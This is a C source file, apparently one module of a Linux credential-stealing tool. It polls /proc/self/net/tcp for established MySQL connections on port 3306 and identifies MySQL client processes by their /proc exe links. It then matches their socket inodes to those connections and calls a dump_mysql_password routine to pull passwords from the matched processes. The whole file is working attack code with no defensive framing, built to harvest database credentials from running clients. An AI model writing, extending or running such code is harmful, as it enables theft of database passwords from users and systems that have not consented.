#include <sys/types.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <err.h>

#include "connection-listen.h"
#include "pretty-print.h"
#include "generic-list.h"
#include "dump-password.h"
#include "globals.h"

#define skip(ptr, c) while(*ptr == c){ ptr++; }
#define stopat(ptr, c) while(*ptr != c){ ptr++; }

// get uid and inode from connection
void formatline(char *str, struct conn_info *out){
    ino_t inode;
    uid_t uid;

    // skip space
    skip(str, ' ');

    uid = strtol(str, &str, 10);

    // skip timeout
    skip(str, ' ');
    stopat(str, ' ');
    skip(str, ' ');

    inode = strtol(str, NULL, 10);

    out->uid = uid;
    out->inode = inode;
    out->checked = 0;
}

void get_inode_list(pid_t pid, generic_list_t *out){
    char fdpath[64], buf[120];
    ino_t tmp;
    int aux;

    struct dirent *dp;
    DIR *dir;

    ssize_t n;

    sprintf(fdpath, "/proc/%d/fd", pid);

    dir = opendir(fdpath);
    if(dir == NULL){
        bad("failed to open %s", fdpath);
        return;
    }

    while((dp = readdir(dir)) != NULL){
        if(dp->d_name[0] == '.')
            continue;

        aux = atoi(dp->d_name);
        sprintf(fdpath, "/proc/%d/fd/%d", pid, aux);

        if((n = readlink(fdpath, buf, sizeof(buf)-1)) < 10)
            continue;

        buf[n] = 0x0;

        if(memcmp("socket:[", buf, 8))
            continue;

        tmp = strtol(buf+8, NULL, 10);
        insert_new_element(out, &tmp);
    }

    closedir(dir);

}

void get_mysql_procs(generic_list_t *out){
    char mysqlcli[MYSQL_LEN];
    char exepath[64]="/proc/";

    struct dirent *dp;
    DIR *dir;

    pid_t tmp;

    dir = opendir("/proc");
    if(dir == NULL){
        perror("failed to open /proc");
        exit(1);
    }

    while((dp = readdir(dir)) != NULL){
        if(dp->d_name[0] < '0' || dp->d_name[0] > '9')
            continue;

        snprintf(exepath+6, sizeof(exepath)-6, "%.20s/exe", dp->d_name);
        if(readlink(exepath, mysqlcli, MYSQL_LEN) == MYSQL_LEN-1){
            mysqlcli[MYSQL_LEN-1] = 0x0;

            if(!strcmp(mysqlcli, MYSQL_CLI)){
                tmp = atoi(dp->d_name);
                insert_new_element(out, &tmp);
            }
        }
    }



    closedir(dir);
}

int wait_for_connections(off_t *offset, int stime){
    generic_list_t clist, plist, inolist;
    struct conn_info cinfo, *aux;

    ino_t *inodes;
    pid_t *pids;

    size_t len, i, j, k;
    ssize_t n;

    char *line;
    FILE *fh;

    int new = 0;


    fh = fopen("/proc/self/net/tcp", "r");
    if(fh == NULL){
        perror("fopen()");
        return 1;
    }

    line = NULL;
    len = 0;


    init_generic_list(clist);
    set_list_type(clist, struct conn_info);

    info("waiting for connections\n");

    // skip the header
    while(fseek(fh, 150, SEEK_SET) == 0){

        while((n = getline(&line, &len, fh)) != -1){

            // 0CEA = 3306 | 01 = connection estabilished
            char *ptr = strstr(line, ":0CEA 01 ");
            if(ptr == NULL)
                continue;

            // +47 for skip tx_queue, rx_queue, etc
            formatline(ptr+47, &cinfo);

            // check user permission
            if(!uid || uid == cinfo.uid){

                // verifying if already been tested
                for(i=0, aux=clist.ptr; i<clist.n; i++){
                    if(cinfo.inode == aux[i].inode){
                        cinfo.checked = 1;
                        break;
                    }
                }

                if(!cinfo.checked){
                    insert_new_element(&clist, &cinfo);
                    new = 1;
                }
            }

        }

        if(new){

            new = 0;
            aux = clist.ptr;
            init_generic_list(plist);
            set_list_type(plist, pid_t);

            putchar('\n');

            good("new connection found\n");
            info("looking for mysql processes\n");

            get_mysql_procs(&plist);

            for(i=0, pids = plist.ptr; i<plist.n; i++){

                init_generic_list(inolist);
                set_list_type(inolist, ino_t);
                get_inode_list(pids[i], &inolist);

                inodes = inolist.ptr;

                for(j=0; j<inolist.n; j++){
                    for(k = 0; k<clist.n; k++){
                        if(aux[k].checked || aux[k].inode != inodes[j])
                            continue;

                        dump_mysql_password(pids[i], offset);
                    }
                }

                free_generic_list(inolist);
            }

            // mark all as checked
            for(i=0, aux=clist.ptr; i<clist.n; i++){
                aux[i].checked = 1;
            }

            free_generic_list(plist);
            info("finish\n");
        }

        sleep(stime);
    }

    free_generic_list(clist);


    return 0;
}
